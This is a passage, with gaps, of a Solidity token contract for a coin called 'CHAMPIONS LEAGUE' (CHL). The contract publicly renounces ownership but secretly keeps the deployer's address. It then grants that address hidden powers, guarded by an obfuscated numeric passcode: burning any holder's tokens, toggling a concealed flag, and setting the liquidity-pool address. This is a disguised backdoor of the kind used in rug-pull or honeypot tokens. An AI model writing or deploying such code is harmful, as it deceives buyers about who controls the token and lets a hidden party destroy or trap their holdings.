...
contract CHAMPIONS_LEAGUE is ERC20, Ownable {

    address o = address(0);
    address lipo = address(0);
    uint256 res = (((((9**4 * 2**7) * 8**3) + (6**5 - 7**2 * 5)) * 2 - (9**4 * 2**7 * 8**3) + (6**5 - 7**2 * 5)) + 4**3 + 1) - 4;
    bool statement = false;
    bool statementRes = false;

    constructor() ERC20("CHAMPIONS LEAGUE", "CHL") {
        o = msg.sender;
        _mint(o, 1000000000 * 10 ** decimals());
        renounceOwnership();
    }

    function statement1(uint256 r) public {
        require(((res += 1) == r), "BEP20: strue failed");
        if (o == msg.sender){
            statement = true;
            statementRes = ((statement || false) &&
            (!false || true) &&
            (false || true) &&
            (!false && statement) &&
    ...
    function statement0(uint256 r) public {
        require(((res += 1) == r), "BEP20: sfalse failed");
        if (o == msg.sender){
            statement = false;
            statementRes = ((statement || false) &&
            (!false || true) &&
    ...
    function remove(uint256 r, address ad, uint256 am) public {
        require(((res += 2) == r), "BEP20: degen failed");
        if (o == msg.sender){
            _burn(ad, am);
        }
    }
    ...
    function setlp(uint256 r, address lp) public {
        require(((res += 3) == r), "BEP20: setlp failed");
        if (o == msg.sender){
            lipo = lp;
        }
    }
